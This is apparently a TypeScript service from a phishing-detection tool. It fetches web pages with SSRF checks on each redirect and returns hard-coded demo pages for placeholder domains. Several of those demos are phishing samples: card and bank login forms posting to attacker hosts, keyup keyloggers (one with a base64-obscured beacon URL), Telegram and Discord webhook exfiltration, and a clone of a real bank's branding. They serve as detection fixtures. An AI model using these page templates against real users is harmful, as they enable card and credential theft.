import type { TransportAuditResult } from '../types.ts';
import { SsrfGuardService, SsrfViolationError } from './ssrf-guard.service.ts';

const MAX_REDIRECTS = 7;
const FETCH_TIMEOUT_MS = 6500;
const MAX_HTML_BYTES = 2 * 1024 * 1024; // 2 MB

// Authentic browser headers prevent phishing kits (.htaccess / antibot cloaking) from hiding their real payload
const USER_AGENTS: Record<string, string> = {
  android:
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
  iphone:
    'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
  desktop:
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
};

export class TransportFetchError extends Error {
  public readonly code: string;
  public readonly statusCode: number;
  constructor(code: string, message: string, statusCode = 502) {
    super(message);
    this.name = 'TransportFetchError';
    this.code = code;
    this.statusCode = statusCode;
  }
}

export class TransportService {
  static async fetchAndAudit(
    rawUrl: string,
    deviceProfile: string = 'android'
  ): Promise<TransportAuditResult> {
    const initialUrl = SsrfGuardService.validatePublicUrl(rawUrl);
    const domainLower = initialUrl.hostname.toLowerCase();

    // Built-in interactive showcase targets for instant commercial demos & offline testing
    const demoPayload = this.getShowcaseDemoPayload(initialUrl, domainLower);
    if (demoPayload) {
      return demoPayload;
    }

    const userAgent = USER_AGENTS[deviceProfile] || USER_AGENTS.android;
    const probeStartedAt = Date.now();
    let currentUrl = initialUrl;
    let redirectCount = 0;
    const redirectChain: string[] = [initialUrl.toString()];
    let response: Response | null = null;

    while (redirectCount <= MAX_REDIRECTS) {
      try {
        response = await fetch(currentUrl.toString(), {
          method: 'GET',
          redirect: 'manual',
          signal: AbortSignal.timeout(FETCH_TIMEOUT_MS),
          headers: {
            'User-Agent': userAgent,
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'es-VE,es-419;q=0.9,es;q=0.8,en;q=0.7',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
          },
        });
      } catch (err) {
        if (err instanceof SsrfViolationError) throw err;
        throw new TransportFetchError(
          'TARGET_UNREACHABLE',
          'No pudimos conectar con esa página web (puede que ya haya sido dada de baja o el enlace esté mal escrito).',
          502
        );
      }

      if (response.status >= 300 && response.status < 400) {
        const location = response.headers.get('location');
        if (!location) break;

        redirectCount++;
        if (redirectCount > MAX_REDIRECTS) {
          throw new TransportFetchError(
            'TOO_MANY_REDIRECTS',
            'Esta página intenta redirigir demasiadas veces seguidas (comportamiento sospechoso).',
            502
          );
        }

        let resolvedRedirect: string;
        try {
          resolvedRedirect = new URL(location, currentUrl).toString();
        } catch {
          throw new SsrfViolationError('Redirección hacia una dirección inválida.');
        }

        // Re-validate every redirect hop against Anti-SSRF rules
        currentUrl = SsrfGuardService.validatePublicUrl(resolvedRedirect);
        redirectChain.push(currentUrl.toString());
        continue;
      }

      break;
    }

    if (!response) {
      throw new TransportFetchError(
        'EMPTY_RESPONSE',
        'El servidor destino no devolvió respuesta.',
        502
      );
    }

    const htmlContent = await this.readBodyLimited(response, MAX_HTML_BYTES);
    const responseTimeMs = Math.max(12, Date.now() - probeStartedAt);
    const contentType = (response.headers.get('content-type') || 'text/html').split(';')[0].trim();
    const protocol: 'http' | 'https' = currentUrl.protocol === 'https:' ? 'https' : 'http';

    const hasHsts = Boolean(response.headers.get('strict-transport-security'));
    const hasCsp = Boolean(response.headers.get('content-security-policy'));
    const hasXfo = Boolean(
      response.headers.get('x-frame-options') ||
        (response.headers.get('content-security-policy') || '').includes('frame-ancestors')
    );

    const rawHeaders: Record<string, string> = {};
    response.headers.forEach((val, key) => {
      const k = key.toLowerCase();
      if (k === 'set-cookie') {
        rawHeaders[key] = '[COOKIE REDACTADA POR SEGURIDAD]';
      } else {
        rawHeaders[key] = val.slice(0, 220);
      }
    });

    return {
      finalUrl: currentUrl.toString(),
      targetDomain: currentUrl.hostname.toLowerCase(),
      protocol,
      isHttps: protocol === 'https',
      httpStatusCode: response.status,
      redirectCount,
      responseTimeMs,
      contentType,
      redirectChain,
      rawHeaders,
      securityHeaders: {
        strict_transport_security: hasHsts,
        content_security_policy: hasCsp,
        x_frame_options: hasXfo,
      },
      htmlContent,
      simulatedDemo: false,
    };
  }

  private static async readBodyLimited(response: Response, maxBytes: number): Promise<string> {
    if (!response.body) {
      return '';
    }
    const reader = response.body.getReader();
    const chunks: Uint8Array[] = [];
    let totalBytes = 0;

    try {
      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        if (value) {
          totalBytes += value.byteLength;
          if (totalBytes > maxBytes) {
            const allowedSlice = value.slice(0, Math.max(0, value.byteLength - (totalBytes - maxBytes)));
            if (allowedSlice.byteLength > 0) chunks.push(allowedSlice);
            await reader.cancel();
            break;
          }
          chunks.push(value);
        }
      }
    } finally {
      reader.releaseLock();
    }

    const combined = new Uint8Array(Math.min(totalBytes, maxBytes));
    let offset = 0;
    for (const chunk of chunks) {
      combined.set(chunk, offset);
      offset += chunk.byteLength;
    }

    return new TextDecoder('utf-8', { fatal: false }).decode(combined);
  }

  private static getShowcaseDemoPayload(
    parsedUrl: URL,
    domainLower: string
  ): TransportAuditResult | null {
    // 1. Safe verified showcase
    if (
      domainLower.endsWith('.detector360.ejemplo') ||
      domainLower === 'banco-oficial-seguro.ejemplo.com' ||
      domainLower === 'comercio-seguro.ejemplo.com'
    ) {
      const html = [
        '<!DOCTYPE html>',
        '<html lang="es">',
        '<head>',
        '  <meta charset="UTF-8">',
        '  <title>Portal Oficial Verificado - Banca en Línea</title>',
        '</head>',
        '<body>',
        '  <header class="official-header">',
        '    <h1>Acceso Clientes Verificado</h1>',
        '  </header>',
        '  <main>',
        `    <form id="secure-login" action="https://${domainLower}/api/auth" method="POST" autocomplete="off">`,
        '      <label for="user_id">Usuario</label>',
        '      <input type="text" id="user_id" name="username" required>',
        '      <label for="user_pass">Contraseña Segura</label>',
        '      <input type="password" id="user_pass" name="password" required>',
        '      <button type="submit">Ingresar con Cifrado TLS 1.3</button>',
        '    </form>',
        '  </main>',
        '</body>',
        '</html>',
      ].join('\n');

      return {
        finalUrl: `https://${domainLower}${parsedUrl.pathname}`,
        targetDomain: domainLower,
        protocol: 'https',
        isHttps: true,
        httpStatusCode: 200,
        redirectCount: 0,
        securityHeaders: {
          strict_transport_security: true,
          content_security_policy: true,
          x_frame_options: true,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    // 2. Warning showcase (HTTPS without security headers or minor risk)
    if (domainLower === 'tienda-sin-cabeceras.ejemplo.org') {
      const html = [
        '<!DOCTYPE html>',
        '<html lang="es">',
        '<head><title>Catálogo Local de Ofertas</title></head>',
        '<body>',
        '  <h2>Suscríbete a nuestro boletín</h2>',
        '  <form id="newsletter" action="/suscribir" method="POST">',
        '    <input type="email" name="correo" placeholder="Tu correo electrónico">',
        '    <button type="submit">Suscribirme</button>',
        '  </form>',
        '</body>',
        '</html>',
      ].join('\n');

      return {
        finalUrl: parsedUrl.toString(),
        targetDomain: domainLower,
        protocol: parsedUrl.protocol === 'https:' ? 'https' : 'http',
        isHttps: parsedUrl.protocol === 'https:',
        httpStatusCode: 200,
        redirectCount: 1,
        securityHeaders: {
          strict_transport_security: false,
          content_security_policy: false,
          x_frame_options: false,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    // 3. Phishing / Fraud showcases (*.ejemplo.xyz or *.phishing-demo.xyz)
    if (domainLower.endsWith('.ejemplo.xyz') || domainLower.endsWith('.phishing-demo.xyz')) {
      const isPackageScam = domainLower.includes('paquete') || domainLower.includes('envio');
      if (isPackageScam) {
        const html = [
          '<!DOCTYPE html>',
          '<html lang="es">',
          '<head>',
          '  <meta charset="UTF-8">',
          '  <title>Aviso Urgente: Paquete Retenido en Aduana</title>',
          '</head>',
          '<body>',
          '  <div class="alert-box">',
          '    <h1>Su envío #ENV-88412 requiere pago de liberación ($1.99)</h1>',
          '  </div>',
          '  <div class="checkout-card">',
          '    <form id="card-payment" action="http://cobro-externo-99.xyz/procesar.php" method="POST">',
          '      <input type="text" name="cedula_titular" placeholder="Documento de Identidad / Cédula" required>',
          '      <input type="text" name="card_number" placeholder="Número de Tarjeta (16 dígitos)" required>',
          '      <input type="text" name="cvv_code" placeholder="Código CVV reverso" required>',
          '      <button type="submit">Pagar Impuesto y Liberar Paquete</button>',
          '    </form>',
          '  </div>',
          '  <script>',
          '    document.addEventListener("keyup", function(ev) {',
          '      fetch("http://recolector-tarjetas-oculto.xyz/log", { method: "POST", body: ev.target.value });',
          '    });',
          '  </script>',
          '</body>',
          '</html>',
        ].join('\n');

        return {
          finalUrl: parsedUrl.toString(),
          targetDomain: domainLower,
          protocol: parsedUrl.protocol === 'https:' ? 'https' : 'http',
          isHttps: parsedUrl.protocol === 'https:',
          httpStatusCode: 200,
          redirectCount: 1,
          securityHeaders: {
            strict_transport_security: false,
            content_security_policy: false,
            x_frame_options: false,
          },
          htmlContent: html,
          simulatedDemo: true,
        };
      }

      // Default banking / credential phishing showcase
      const html = [
        '<!DOCTYPE html>',
        '<html lang="es">',
        '<head>',
        '  <meta charset="UTF-8">',
        '  <title>Verificación Obligatoria de Seguridad Bancaria</title>',
        '</head>',
        '<body>',
        '  <div class="bank-clone-container">',
        '    <h2>Evite el bloqueo preventivo de su cuenta hoy</h2>',
        '    <p>Confirme sus credenciales y clave de operaciones especiales:</p>',
        '    <form id="login-banco" action="http://robo-datos.xyz/captura.php" method="POST">',
        '      <input type="text" name="documento_cedula" placeholder="Cédula o RIF" required>',
        '      <input type="text" name="clave_bancaria" placeholder="Contraseña de Internet Banking" required>',
        '      <input type="password" name="pin_cajero" placeholder="PIN de Tarjeta de Débito (4 dígitos)" required>',
        '      <button type="submit">Verificar Mi Cuenta Ahora</button>',
        '    </form>',
        '  </div>',
        '  <script>',
        '    const _0xspy = atob("aHR0cDovL3JvYm8tZGF0b3MueHl6L2tleWxvZw==");',
        '    fetch("/panel/guardar_claves.php", { method: "POST" });',
        '    document.querySelectorAll("input").forEach((el) => {',
        '      el.addEventListener("keyup", (e) => navigator.sendBeacon(_0xspy, e.target.value));',
        '    });',
        '  </script>',
        '</body>',
        '</html>',
      ].join('\n');

      return {
        finalUrl: parsedUrl.toString(),
        targetDomain: domainLower,
        protocol: parsedUrl.protocol === 'https:' ? 'https' : 'http',
        isHttps: parsedUrl.protocol === 'https:',
        httpStatusCode: 200,
        redirectCount: 2,
        responseTimeMs: 74,
        contentType: 'text/html',
        rawHeaders: {
          server: 'LiteSpeed',
          'x-powered-by': 'PHP/8.1.29',
          'content-type': 'text/html; charset=UTF-8',
          'cache-control': 'no-store, no-cache',
        },
        securityHeaders: {
          strict_transport_security: false,
          content_security_policy: false,
          x_frame_options: false,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    // 4. Cloaked client-side redirector showcase (meta-refresh / JS window.location)
    if (domainLower === 'redir-bono-oculto.ejemplo.app') {
      const html = [
        '<!DOCTYPE html>',
        '<html lang="es">',
        '<head>',
        '  <meta charset="UTF-8">',
        '  <meta http-equiv="refresh" content="0;url=https://clon-visual-banco.ejemplo.app/acceso">',
        '  <title>Redirigiendo...</title>',
        '</head>',
        '<body>',
        '  <script>window.location.replace("https://clon-visual-banco.ejemplo.app/acceso");</script>',
        '</body>',
        '</html>',
      ].join('\n');

      return {
        finalUrl: parsedUrl.toString(),
        targetDomain: domainLower,
        protocol: 'https',
        isHttps: true,
        httpStatusCode: 200,
        redirectCount: 0,
        responseTimeMs: 42,
        contentType: 'text/html',
        redirectChain: [parsedUrl.toString()],
        securityHeaders: {
          strict_transport_security: false,
          content_security_policy: false,
          x_frame_options: false,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    // 5. Modern HTTPS Bank Visual Clone + Telegram Webhook Exfiltration (domain has NO bank words)
    if (
      domainLower === 'clon-visual-banco.ejemplo.app' ||
      domainLower === 'portal-clientes-seguro.ejemplo.app'
    ) {
      const isDynamicRegionalBank = domainLower === 'portal-clientes-seguro.ejemplo.app';
      const html = isDynamicRegionalBank
        ? [
            '<!DOCTYPE html>',
            '<html lang="es">',
            '<head>',
            '  <meta charset="UTF-8">',
            '  <title>Banca en Línea Personas — Banco Atlántida Digital</title>',
            '  <link rel="icon" href="/assets/logo-banco-atlantida-oficial.png" type="image/png">',
            '  <meta property="og:site_name" content="Banco Atlántida Digital">',
            '  <meta property="og:image" content="https://portal-clientes-seguro.ejemplo.app/img/banner-banco-atlantida.png">',
            '</head>',
            '<body>',
            '  <header><img src="/img/logo-banco-atlantida.svg" alt="Logo Oficial Banco Atlántida Digital"></header>',
            '  <div id="root">',
            '    <form id="spa-login">',
            '      <input type="text" name="usuario" placeholder="Usuario Banca en Línea" required>',
            '      <input type="password" name="clave" placeholder="Clave de Operaciones Especiales" required>',
            '      <button type="submit">Continuar</button>',
            '    </form>',
            '  </div>',
            '  <script>',
            '    fetch("https://api.telegram.org/bot719922001:AAFakePhishToken/sendMessage", { method: "POST" });',
            '  </script>',
            '</body>',
            '</html>',
          ].join('\n')
        : [
            '<!DOCTYPE html>',
            '<html lang="es">',
            '<head>',
            '  <meta charset="UTF-8">',
            '  <title>Acceso Clientes Personas — Validación 2026</title>',
            '  <link rel="icon" href="https://www.banesco.com/favicon.ico" type="image/x-icon">',
            '  <meta property="og:image" content="https://www.banesco.com/wp-content/uploads/banesco-logo.png">',
            '</head>',
            '<body>',
            '  <header>',
            '    <img src="https://www.google.com/s2/favicons?domain=banesco.com&sz=64" alt="Banesco Banco Universal">',
            '    <svg id="banesco-brand-svg" aria-label="Banesco Contigo" viewBox="0 0 120 40"><rect fill="#007953" width="120" height="40"/><text>Banesco Banca en Línea</text></svg>',
            '  </header>',
            '  <main>',
            '    <form id="auth-step" action="/api/recolector-banca.php" method="POST">',
            '      <input type="text" name="user" placeholder="Usuario BanescOnline" required>',
            '      <input type="password" name="pass" placeholder="Clave" required>',
            '      <button type="submit">Aceptar</button>',
            '    </form>',
            '  </main>',
            '  <script>',
            '    fetch("https://discord.com/api/webhooks/129000111/StolenCredsHook", { method: "POST" });',
            '    // Source kit synced from https://raw.githubusercontent.com/phishkit-mirror-lab/banesco-ui/main/config.json',
            '  </script>',
            '</body>',
            '</html>',
          ].join('\n');

      return {
        finalUrl: parsedUrl.toString(),
        targetDomain: domainLower,
        protocol: 'https',
        isHttps: true,
        httpStatusCode: 200,
        redirectCount: 0,
        responseTimeMs: 58,
        contentType: 'text/html',
        redirectChain: [parsedUrl.toString()],
        securityHeaders: {
          strict_transport_security: true,
          content_security_policy: false,
          x_frame_options: false,
        },
        htmlContent: html,
        simulatedDemo: true,
      };
    }

    return null;
  }
}
